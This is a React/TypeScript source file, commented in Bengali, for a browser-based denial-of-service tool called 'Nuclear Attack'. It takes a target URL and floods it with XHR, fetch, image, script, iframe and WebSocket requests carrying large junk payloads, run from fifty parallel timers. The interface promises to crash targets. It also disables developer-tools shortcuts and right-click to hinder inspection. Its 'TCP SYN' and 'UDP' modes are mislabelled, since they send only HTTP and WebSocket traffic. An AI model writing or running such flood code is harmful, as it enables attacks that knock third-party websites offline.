"use client"
import React, { useState, useEffect, useRef } from 'react';
import './NuclearAttack.css';

const NuclearAttack: React.FC = () => {
  const [isAttacking, setIsAttacking] = useState<boolean>(false);
  const [strikeCount, setStrikeCount] = useState<number>(0);
  const [attackPower, setAttackPower] = useState<number>(100);
  const [targetUrl, setTargetUrl] = useState<string>('');
  const [selectedCard, setSelectedCard] = useState<number>(0);
  const [health, setHealth] = useState<number>(100);
  const [radiation, setRadiation] = useState<number>(0);
  const [ttd, setTtd] = useState<number>(0);
  
  const workers = useRef<any[]>([]);
  const statsInterval = useRef<NodeJS.Timeout | null>(null);
  const warningInterval = useRef<NodeJS.Timeout | null>(null);
  const attackInterval = useRef<NodeJS.Timeout | null>(null);

  // অ্যাটাক ফাংশন - HTTP Flood
  const nuclearHttpFlood = async (url: string) => {
    for(let i = 0; i < 100; i++) {
      try {
        // XMLHttpRequest অ্যাটাক
        const xhr = new XMLHttpRequest();
        xhr.open('GET', url + '?nuclear=' + Math.random() + '&' + 'X'.repeat(5000), true);
        xhr.timeout = 1;
        xhr.send();
        
        // Fetch অ্যাটাক
        fetch(url + '?atomic=' + Math.random(), { 
          mode: 'no-cors',
          cache: 'no-store',
          headers: {
            'X-Nuclear': 'X'.repeat(10000)
          }
        }).catch(e => {});
        
        // ইমেজ অ্যাটাক
        const img = new Image();
        img.src = url + '/bomb_' + Math.random() + '?' + 'X'.repeat(2000);
        
        // Script অ্যাটাক
        const script = document.createElement('script');
        script.src = url + '/script_' + Math.random();
        document.body.appendChild(script);
        setTimeout(() => {
          try { document.body.removeChild(script); } catch(e) {}
        }, 1);
        
      } catch(e) {}
    }
    setStrikeCount(prev => prev + 100);
    setRadiation(prev => prev + 50);
  };

  // TCP SYN Flood
  const atomTcpFlood = async (url: string) => {
    for(let i = 0; i < 200; i++) {
      try {
        // XMLHttpRequest অ্যাটাক
        const xhr = new XMLHttpRequest();
        xhr.open('GET', url + '?syn=' + Math.random(), true);
        xhr.timeout = 1;
        xhr.send();
        
        // ওয়েবসকেট অ্যাটাক
        try {
          const ws = new WebSocket(url.replace('http', 'ws'));
          ws.onopen = () => {
            ws.send('X'.repeat(10000));
            setTimeout(() => ws.close(), 1);
          };
        } catch(e) {}
        
        // Fetch POST অ্যাটাক
        fetch(url + '?tcp=' + Math.random(), {
          method: 'POST',
          mode: 'no-cors',
          body: 'X'.repeat(10000)
        }).catch(e => {});
        
      } catch(e) {}
    }
    setStrikeCount(prev => prev + 200);
    setRadiation(prev => prev + 100);
  };

  // UDP Flood
  const hydrogenUdpFlood = async (url: string) => {
    for(let i = 0; i < 500; i++) {
      try {
        // মাল্টিপল ফেচ অ্যাটাক
        fetch(url + '?udp=' + Math.random(), { 
          mode: 'no-cors',
          method: 'POST',
          body: 'X'.repeat(10000)
        }).catch(e => {});
        
        // XHR POST অ্যাটাক
        const xhr = new XMLHttpRequest();
        xhr.open('POST', url + '?udp=' + Math.random(), true);
        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
        xhr.send('X'.repeat(10000));
        
        // ইমেজ অ্যাটাক
        const img = new Image();
        img.src = url + '/udp_' + Math.random() + '?' + 'X'.repeat(5000);
        
      } catch(e) {}
    }
    setStrikeCount(prev => prev + 500);
    setRadiation(prev => prev + 250);
  };

  // Super Nova Attack (সব থেকে পাওয়ারফুল)
  const superNovaAttack = async (url: string) => {
    for(let i = 0; i < 1000; i++) {
      try {
        // ১০০০ কানেকশন একসাথে
        
        // XHR অ্যাটাক
        const xhr = new XMLHttpRequest();
        xhr.open('GET', url + '?nova=' + Math.random() + '&' + 'X'.repeat(10000), true);
        xhr.timeout = 1;
        xhr.send();
        
        // Fetch অ্যাটাক
        fetch(url + '?super=' + Math.random(), { 
          mode: 'no-cors',
          method: 'POST',
          body: 'X'.repeat(50000)
        }).catch(e => {});
        
        // মাল্টিপল ইমেজ অ্যাটাক
        const img1 = new Image();
        img1.src = url + '/nova1_' + Math.random() + '?' + 'X'.repeat(10000);
        
        const img2 = new Image();
        img2.src = url + '/nova2_' + Math.random() + '?' + 'X'.repeat(10000);
        
        const img3 = new Image();
        img3.src = url + '/nova3_' + Math.random() + '?' + 'X'.repeat(10000);
        
        // ওয়েবসকেট অ্যাটাক
        try {
          const ws = new WebSocket(url.replace('http', 'ws'));
          ws.onopen = () => {
            ws.send('X'.repeat(50000));
            setTimeout(() => ws.close(), 1);
          };
        } catch(e) {}
        
        // Script অ্যাটাক
        const script = document.createElement('script');
        script.src = url + '/nova_' + Math.random();
        document.body.appendChild(script);
        setTimeout(() => {
          try { document.body.removeChild(script); } catch(e) {}
        }, 1);
        
        // Iframe অ্যাটাক
        const iframe = document.createElement('iframe');
        iframe.src = url + '/iframe_' + Math.random();
        iframe.style.display = 'none';
        document.body.appendChild(iframe);
        setTimeout(() => {
          try { document.body.removeChild(iframe); } catch(e) {}
        }, 1);
        
      } catch(e) {}
    }
    setStrikeCount(prev => prev + 1000);
    setRadiation(prev => prev + 500);
  };

  // অ্যাটাক কন্ট্রোলার
  const startAttack = (url: string) => {
    // ৫০টি প্যারালাল থ্রেড
    for(let i = 0; i < 50; i++) {
      if(!isAttacking) break;
      
      const worker = setInterval(async () => {
        if(!isAttacking) {
          clearInterval(worker);
          return;
        }
        
        try {
          if(attackPower === 100) {
            await nuclearHttpFlood(url);
          } else if(attackPower === 200) {
            await atomTcpFlood(url);
          } else if(attackPower === 300) {
            await hydrogenUdpFlood(url);
          } else {
            await superNovaAttack(url);
          }
        } catch(e) {
          setStrikeCount(prev => prev + 1);
        }
      }, 1);
      
      workers.current.push(worker);
    }
  };

  // ফায়ার বাটন ক্লিক
  const handleFireClick = () => {
    if(isAttacking) {
      emergencyStop();
      return;
    }

    if(!targetUrl.startsWith('http')) {
      alert('ERROR: http:// বা https:// দিয়ে URL শুরু করুন!');
      return;
    }

    // সব স্টেট রিসেট
    setIsAttacking(true);
    setStrikeCount(0);
    setRadiation(0);
    setHealth(100);
    
    // অ্যাটাক শুরু
    startAttack(targetUrl);
    
    // স্ট্যাটস আপডেট
    statsInterval.current = setInterval(() => {
      setStrikeCount(prev => prev);
      setRadiation(prev => {
        const newRad = prev;
        return newRad;
      });
      
      setHealth(prev => {
        const newHealth = Math.max(0, 100 - Math.floor(strikeCount / 1000));
        return newHealth;
      });
      
      setTtd(Math.max(0, Math.floor(health / 10)));
    }, 100);
    
    // ওয়ার্নিং আপডেট
    let warningCount = 0;
    warningInterval.current = setInterval(() => {
      if(!isAttacking) {
        clearInterval(warningInterval.current!);
        return;
      }
      
      warningCount++;
      const warningElement = document.querySelector('.warning');
      if(warningElement) {
        if(strikeCount > 100000) {
          warningElement.innerHTML = '💀 TARGET DESTROYED - MISSION COMPLETE 💀';
        } else {
          warningElement.innerHTML = '⚠️ NUCLEAR RADIATION: ' + (warningCount * 10) + '% ⚠️';
        }
      }
    }, 500);
  };

  // ইমার্জেন্সি স্টপ
  const emergencyStop = () => {
    setIsAttacking(false);
    
    // সব ওয়ার্কার ক্লিয়ার
    workers.current.forEach(worker => clearInterval(worker));
    workers.current = [];
    
    if(statsInterval.current) clearInterval(statsInterval.current);
    if(warningInterval.current) clearInterval(warningInterval.current);
    if(attackInterval.current) clearInterval(attackInterval.current);
    
    // উইন্ডো স্টপ
    window.stop();
    
    // ওয়ার্নিং রিসেট
    const warningElement = document.querySelector('.warning');
    if(warningElement) {
      warningElement.innerHTML = '⚠️ WARNING: EXTREME POWER - TARGET WILL CRASH IN SECONDS ⚠️';
    }
  };

  // কীবোর্ড শর্টকাট ব্লক
  useEffect(() => {
    const handleKeyDown = (e: KeyboardEvent) => {
      // ESC প্রেস করলে স্টপ
      if(e.key === 'Escape' && isAttacking) {
        emergencyStop();
      }

      // F12
      if(e.keyCode === 123) {
        e.preventDefault();
        return false;
      }

      // Ctrl+Shift+I
      if(e.ctrlKey && e.shiftKey && e.keyCode === 73) {
        e.preventDefault();
        return false;
      }

      // Ctrl+Shift+J
      if(e.ctrlKey && e.shiftKey && e.keyCode === 74) {
        e.preventDefault();
        return false;
      }

      // Ctrl+U
      if(e.ctrlKey && e.keyCode === 85) {
        e.preventDefault();
        return false;
      }

      // Ctrl+S
      if(e.ctrlKey && e.keyCode === 83) {
        e.preventDefault();
        return false;
      }
    };

    const handleContextMenu = (e: MouseEvent) => {
      e.preventDefault();
    };

    document.addEventListener('keydown', handleKeyDown);
    document.addEventListener('contextmenu', handleContextMenu);

    return () => {
      document.removeEventListener('keydown', handleKeyDown);
      document.removeEventListener('contextmenu', handleContextMenu);
      emergencyStop();
    };
  }, [isAttacking]);

  // রেডিয়েশন ডিসপ্লে ফরম্যাট
  const getRadiationDisplay = () => {
    if(radiation > 999) {
      return (radiation/1000).toFixed(1) + 'GB';
    }
    return radiation + 'MB';
  };

  return (
    <div className="control-panel">
      <div className="header">
        <h1>💀 NUCLEAR ATTACK MODE 💀</h1>
        <div className="warning">⚠️ WARNING: EXTREME POWER - TARGET WILL CRASH IN SECONDS ⚠️</div>
      </div>

      <div className="input-group">
        <label>🎯 TARGET URL</label>
        <input 
          type="text" 
          value={targetUrl}
          onChange={(e) => setTargetUrl(e.target.value)}
          disabled={isAttacking}
        />
      </div>

      <div className="attack-options">
        <div 
          className={`attack-card ${selectedCard === 0 ? 'selected' : ''}`}
          onClick={() => !isAttacking && setSelectedCard(0) && setAttackPower(100)}
        >
          <h3>🔥 NUCLEAR HTTP</h3>
          <p>100,000 req/sec</p>
        </div>
        <div 
          className={`attack-card ${selectedCard === 1 ? 'selected' : ''}`}
          onClick={() => !isAttacking && setSelectedCard(1) && setAttackPower(200)}
        >
          <h3>💀 ATOM TCP</h3>
          <p>200,000 packets/sec</p>
        </div>
        <div 
          className={`attack-card ${selectedCard === 2 ? 'selected' : ''}`}
          onClick={() => !isAttacking && setSelectedCard(2) && setAttackPower(300)}
        >
          <h3>⚡ HYDROGEN UDP</h3>
          <p>500 MB/sec</p>
        </div>
        <div 
          className={`attack-card ${selectedCard === 3 ? 'selected' : ''}`}
          onClick={() => !isAttacking && setSelectedCard(3) && setAttackPower(500)}
        >
          <h3>🌋 SUPER NOVA</h3>
          <p>ALL MAXIMUM</p>
        </div>
      </div>

      <div className="stats-grid">
        <div className="stat-box">
          <div className="stat-label">NUCLEAR STRIKES</div>
          <div className="stat-value">{strikeCount.toLocaleString()}</div>
        </div>
        <div className="stat-box">
          <div className="stat-label">RADIATION</div>
          <div className="stat-value">{getRadiationDisplay()}</div>
        </div>
        <div className="stat-box">
          <div className="stat-label">TARGET HEALTH</div>
          <div className="stat-value">{health <= 0 ? '0% 💀' : health + '%'}</div>
        </div>
        <div className="stat-box">
          <div className="stat-label">TIME TO DEATH</div>
          <div className="stat-value">{health <= 0 ? 'DEAD' : ttd + 's'}</div>
        </div>
      </div>

      <button 
        className="btn-nuclear" 
        onClick={handleFireClick}
      >
        {isAttacking ? '💥 NUCLEAR STRIKE IN PROGRESS 💥' : '💣 LAUNCH NUCLEAR ATTACK 💣'}
      </button>
      
      <div 
        style={{ textAlign: 'center', color: '#660000', cursor: 'pointer', fontSize: '20px', marginTop: '10px' }} 
        onClick={emergencyStop}
      >
        ⚠️ EMERGENCY STOP (ESC) ⚠️
      </div>
    </div>
  );
};

export default NuclearAttack;